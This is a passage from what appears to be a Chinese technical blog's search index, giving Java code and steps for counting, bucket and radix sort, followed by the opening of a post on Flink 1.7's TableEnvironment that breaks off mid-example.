class="token punctuation">.</span><span class="token function">floor</span><span class="token punctuation">(</span>len <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span> i <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">--</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">heapify</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> i<span class="token punctuation">,</span> len<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">heapify</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr<span class="token punctuation">,</span> <span class="token keyword">int</span> i<span class="token punctuation">,</span> <span class="token keyword">int</span> len<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> left <span class="token operator">=</span> <span class="token number">2</span> <span class="token operator">*</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> right <span class="token operator">=</span> <span class="token number">2</span> <span class="token operator">*</span> i <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> largest <span class="token operator">=</span> i<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>left <span class="token operator">&lt;</span> len <span class="token operator">&amp;&amp;</span> arr<span class="token punctuation">[</span>left<span class="token punctuation">]</span> <span class="token operator">></span> arr<span class="token punctuation">[</span>largest<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            largest <span class="token operator">=</span> left<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>right <span class="token operator">&lt;</span> len <span class="token operator">&amp;&amp;</span> arr<span class="token punctuation">[</span>right<span class="token punctuation">]</span> <span class="token operator">></span> arr<span class="token punctuation">[</span>largest<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            largest <span class="token operator">=</span> right<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>largest <span class="token operator">!=</span> i<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">swap</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> i<span class="token punctuation">,</span> largest<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">heapify</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> largest<span class="token punctuation">,</span> len<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">swap</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr<span class="token punctuation">,</span> <span class="token keyword">int</span> i<span class="token punctuation">,</span> <span class="token keyword">int</span> j<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> temp <span class="token operator">=</span> arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> arr<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>        arr<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> temp<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h3 id="8-计数排序"><a href="#8-计数排序" class="headerlink" title="8. 计数排序"></a>8. 计数排序</h3><h4 id="8-1-算法步骤"><a href="#8-1-算法步骤" class="headerlink" title="8.1 算法步骤"></a>8.1 算法步骤</h4><ul><li>花O(n)的时间扫描一下整个序列 A，获取最小值 min 和最大值 max</li><li>开辟一块新的空间创建新的数组 B，长度为 ( max - min + 1)</li><li>数组 B 中 index 的元素记录的值是 A 中某元素出现的次数</li><li>最后输出目标整数序列，具体的逻辑是遍历数组 B，输出相应元素以及对应的个数</li></ul><h4 id="8-2-动画演示"><a href="#8-2-动画演示" class="headerlink" title="8.2 动画演示"></a>8.2 动画演示</h4><p><a href="https://github.com/XuQianJin-Stars/XuQianJin-Stars.github.io/blob/master/medias/排序算法/计数排序.gif"><img src="https://github.com/XuQianJin-Stars/XuQianJin-Stars.github.io/raw/master/medias/排序算法/计数排序.gif" alt="img"></a>计数排序动画演示</p><h4 id="8-3-参考代码"><a href="#8-3-参考代码" class="headerlink" title="8.3 参考代码"></a>8.3 参考代码</h4><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">//Java 代码实现</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CountingSort</span> <span class="token keyword">implements</span> <span class="token class-name">IArraySort</span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">sort</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> sourceArray<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// 对 arr 进行拷贝，不改变参数内容</span>        <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr <span class="token operator">=</span> Arrays<span class="token punctuation">.</span><span class="token function">copyOf</span><span class="token punctuation">(</span>sourceArray<span class="token punctuation">,</span> sourceArray<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> maxValue <span class="token operator">=</span> <span class="token function">getMaxValue</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token function">countingSort</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> maxValue<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">private</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">countingSort</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr<span class="token punctuation">,</span> <span class="token keyword">int</span> maxValue<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> bucketLen <span class="token operator">=</span> maxValue <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bucket <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">int</span><span class="token punctuation">[</span>bucketLen<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> value <span class="token operator">:</span> arr<span class="token punctuation">)</span> <span class="token punctuation">{</span>            bucket<span class="token punctuation">[</span>value<span class="token punctuation">]</span><span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">int</span> sortedIndex <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> bucketLen<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">while</span> <span class="token punctuation">(</span>bucket<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                arr<span class="token punctuation">[</span>sortedIndex<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> j<span class="token punctuation">;</span>                bucket<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">--</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> arr<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">private</span> <span class="token keyword">int</span> <span class="token function">getMaxValue</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> maxValue <span class="token operator">=</span> arr<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> value <span class="token operator">:</span> arr<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>maxValue <span class="token operator">&lt;</span> value<span class="token punctuation">)</span> <span class="token punctuation">{</span>                maxValue <span class="token operator">=</span> value<span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> maxValue<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h3 id="9-桶排序"><a href="#9-桶排序" class="headerlink" title="9. 桶排序"></a>9. 桶排序</h3><h4 id="9-1-算法步骤"><a href="#9-1-算法步骤" class="headerlink" title="9.1 算法步骤"></a>9.1 算法步骤</h4><ul><li>设置固定数量的空桶。</li><li>把数据放到对应的桶中。</li><li>对每个不为空的桶中数据进行排序。</li><li>拼接不为空的桶中数据，得到结果</li></ul><h4 id="9-2-动画演示"><a href="#9-2-动画演示" class="headerlink" title="9.2 动画演示"></a>9.2 动画演示</h4><p><a href="https://github.com/XuQianJin-Stars/XuQianJin-Stars.github.io/blob/master/medias/排序算法/桶排序.gif"><img src="https://github.com/XuQianJin-Stars/XuQianJin-Stars.github.io/raw/master/medias/排序算法/桶排序.gif" alt="img"></a>桶排序动画演示</p><h4 id="9-3-参考代码"><a href="#9-3-参考代码" class="headerlink" title="9.3 参考代码"></a>9.3 参考代码</h4><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">//Java 代码实现</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">BucketSort</span> <span class="token keyword">implements</span> <span class="token class-name">IArraySort</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> InsertSort insertSort <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InsertSort</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">sort</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> sourceArray<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// 对 arr 进行拷贝，不改变参数内容</span>        <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr <span class="token operator">=</span> Arrays<span class="token punctuation">.</span><span class="token function">copyOf</span><span class="token punctuation">(</span>sourceArray<span class="token punctuation">,</span> sourceArray<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token function">bucketSort</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">private</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">bucketSort</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr<span class="token punctuation">,</span> <span class="token keyword">int</span> bucketSize<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>arr<span class="token punctuation">.</span>length <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> arr<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">int</span> minValue <span class="token operator">=</span> arr<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> maxValue <span class="token operator">=</span> arr<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> value <span class="token operator">:</span> arr<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>value <span class="token operator">&lt;</span> minValue<span class="token punctuation">)</span> <span class="token punctuation">{</span>                minValue <span class="token operator">=</span> value<span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>value <span class="token operator">></span> maxValue<span class="token punctuation">)</span> <span class="token punctuation">{</span>                maxValue <span class="token operator">=</span> value<span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">int</span> bucketCount <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span> Math<span class="token punctuation">.</span><span class="token function">floor</span><span class="token punctuation">(</span><span class="token punctuation">(</span>maxValue <span class="token operator">-</span> minValue<span class="token punctuation">)</span> <span class="token operator">/</span> bucketSize<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> buckets <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">int</span><span class="token punctuation">[</span>bucketCount<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 利用映射函数将数据分配到各个桶中</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> arr<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">int</span> index <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span> Math<span class="token punctuation">.</span><span class="token function">floor</span><span class="token punctuation">(</span><span class="token punctuation">(</span>arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> minValue<span class="token punctuation">)</span> <span class="token operator">/</span> bucketSize<span class="token punctuation">)</span><span class="token punctuation">;</span>            buckets<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">arrAppend</span><span class="token punctuation">(</span>buckets<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">,</span> arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">int</span> arrIndex <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bucket <span class="token operator">:</span> buckets<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>bucket<span class="token punctuation">.</span>length <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">continue</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token comment" spellcheck="true">// 对每个桶进行排序，这里使用了插入排序</span>            bucket <span class="token operator">=</span> insertSort<span class="token punctuation">.</span><span class="token function">sort</span><span class="token punctuation">(</span>bucket<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> value <span class="token operator">:</span> bucket<span class="token punctuation">)</span> <span class="token punctuation">{</span>                arr<span class="token punctuation">[</span>arrIndex<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> value<span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> arr<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/**     * 自动扩容，并保存数据     *     * @param arr     * @param value     */</span>    <span class="token keyword">private</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">arrAppend</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr<span class="token punctuation">,</span> <span class="token keyword">int</span> value<span class="token punctuation">)</span> <span class="token punctuation">{</span>        arr <span class="token operator">=</span> Arrays<span class="token punctuation">.</span><span class="token function">copyOf</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> arr<span class="token punctuation">.</span>length <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        arr<span class="token punctuation">[</span>arr<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> value<span class="token punctuation">;</span>        <span class="token keyword">return</span> arr<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h3 id="10-基数排序"><a href="#10-基数排序" class="headerlink" title="10. 基数排序"></a>10. 基数排序</h3><h4 id="10-1-算法步骤"><a href="#10-1-算法步骤" class="headerlink" title="10.1 算法步骤"></a>10.1 算法步骤</h4><ul><li>将所有待比较数值（正整数）统一为同样的数位长度，数位较短的数前面补零</li><li>从最低位开始，依次进行一次排序</li><li>从最低位排序一直到最高位排序完成以后, 数列就变成一个有序序列</li></ul><h4 id="10-2-动画演示"><a href="#10-2-动画演示" class="headerlink" title="10.2 动画演示"></a>10.2 动画演示</h4><p><a href="https://github.com/XuQianJin-Stars/XuQianJin-Stars.github.io/blob/master/medias/排序算法/基数排序.gif"><img src="https://github.com/XuQianJin-Stars/XuQianJin-Stars.github.io/raw/master/medias/排序算法/基数排序.gif" alt="img"></a> 基数排序动画演示</p><h4 id="10-3-参考代码"><a href="#10-3-参考代码" class="headerlink" title="10.3 参考代码"></a>10.3 参考代码</h4><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">//Java 代码实现</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">RadixSort</span> <span class="token keyword">implements</span> <span class="token class-name">IArraySort</span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">sort</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> sourceArray<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// 对 arr 进行拷贝，不改变参数内容</span>        <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr <span class="token operator">=</span> Arrays<span class="token punctuation">.</span><span class="token function">copyOf</span><span class="token punctuation">(</span>sourceArray<span class="token punctuation">,</span> sourceArray<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> maxDigit <span class="token operator">=</span> <span class="token function">getMaxDigit</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token function">radixSort</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> maxDigit<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/**     * 获取最高位数     */</span>    <span class="token keyword">private</span> <span class="token keyword">int</span> <span class="token function">getMaxDigit</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> maxValue <span class="token operator">=</span> <span class="token function">getMaxValue</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token function">getNumLenght</span><span class="token punctuation">(</span>maxValue<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">private</span> <span class="token keyword">int</span> <span class="token function">getMaxValue</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> maxValue <span class="token operator">=</span> arr<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> value <span class="token operator">:</span> arr<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>maxValue <span class="token operator">&lt;</span> value<span class="token punctuation">)</span> <span class="token punctuation">{</span>                maxValue <span class="token operator">=</span> value<span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> maxValue<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">protected</span> <span class="token keyword">int</span> <span class="token function">getNumLenght</span><span class="token punctuation">(</span><span class="token keyword">long</span> num<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>num <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">int</span> lenght <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">long</span> temp <span class="token operator">=</span> num<span class="token punctuation">;</span> temp <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">;</span> temp <span class="token operator">/=</span> <span class="token number">10</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            lenght<span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> lenght<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">private</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">radixSort</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr<span class="token punctuation">,</span> <span class="token keyword">int</span> maxDigit<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> mod <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> dev <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> maxDigit<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">,</span> dev <span class="token operator">*=</span> <span class="token number">10</span><span class="token punctuation">,</span> mod <span class="token operator">*=</span> <span class="token number">10</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// 考虑负数的情况，这里扩展一倍队列数，其中 [0-9]对应负数，[10-19]对应正数 (bucket + 10)</span>            <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> counter <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">int</span><span class="token punctuation">[</span>mod <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> arr<span class="token punctuation">.</span>length<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">int</span> bucket <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>arr<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">%</span> mod<span class="token punctuation">)</span> <span class="token operator">/</span> dev<span class="token punctuation">)</span> <span class="token operator">+</span> mod<span class="token punctuation">;</span>                counter<span class="token punctuation">[</span>bucket<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">arrayAppend</span><span class="token punctuation">(</span>counter<span class="token punctuation">[</span>bucket<span class="token punctuation">]</span><span class="token punctuation">,</span> arr<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">int</span> pos <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bucket <span class="token operator">:</span> counter<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> value <span class="token operator">:</span> bucket<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    arr<span class="token punctuation">[</span>pos<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> value<span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> arr<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">private</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">arrayAppend</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr<span class="token punctuation">,</span> <span class="token keyword">int</span> value<span class="token punctuation">)</span> <span class="token punctuation">{</span>        arr <span class="token operator">=</span> Arrays<span class="token punctuation">.</span><span class="token function">copyOf</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> arr<span class="token punctuation">.</span>length <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        arr<span class="token punctuation">[</span>arr<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> value<span class="token punctuation">;</span>        <span class="token keyword">return</span> arr<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>本文转载自: <a href="https://mp.weixin.qq.com/s/GKBHCh97Oo1dLWdG0LEogA" target="_blank" rel="noopener">原文</a></p>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> algorithm </tag>
            
            <tag> 排序 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Flink1.7 Table API&amp;SQL源码系列之TableEnvironment</title>
      <link href="/2018/12/29/flink/flink1.7-table-api-sql-yuan-ma-xi-lie-zhi-tableenvironment/"/>
      <url>/2018/12/29/flink/flink1.7-table-api-sql-yuan-ma-xi-lie-zhi-tableenvironment/</url>
      
        <content type="html"><![CDATA[<h2 id="Flink1-7-Table-API-amp-SQL源码系列之TableEnvironment"><a href="#Flink1-7-Table-API-amp-SQL源码系列之TableEnvironment" class="headerlink" title="Flink1.7 Table API&amp;SQL源码系列之TableEnvironment"></a>Flink1.7 Table API&amp;SQL源码系列之TableEnvironment</h2><h1 id="一、TableEnvironment的示例使用"><a href="#一、TableEnvironment的示例使用" class="headerlink" title="一、TableEnvironment的示例使用"></a>一、TableEnvironment的示例使用</h1><p>为了更好的直观的理解TableEnvironment,下面我给出了Java和Scala代码使用示例。</p><h2 id="Java代码示例"><a href="#Java代码示例" class="headerlink" title="Java代码示例"></a>Java代码示例</h2><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">// 对于批处理程序来说使用 ExecutionEnvironment 来替换 StreamExecutionEnvironment</span>StreamExecutionEnvironment env <span class="token operator">=</span> StreamExecutionEnvironment<span class="token punctuation">.</span><span class="token function">getExecutionEnvironment</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 创建一个TableEnvironment</span><span class="token comment" spellcheck="true">// 对于批处理程序来说使用 BatchTableEnvironment 替换 StreamTableEnvironment</span>StreamTableEnvironment tableEnv <span class="token operator">=</span> TableEnvironment<span class="token punctuation">.</span><span class="token function">getTableEnvironment</span><span class="token punctuation">(</span>env<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 注册一个 Table</span>tableEnv<span class="token punctuation">.</span><span class="token function">registerTable</span><span class="token punctuation">(</span><span class="token string">"table1"</span><span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span>            <span class="token comment" spellcheck="true">// 或者</span>tableEnv<span class="token punctuation">.</span><span class="token function">registerTableSource</span><span class="token punctuation">(</span><span class="token string">"table2"</span><span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token 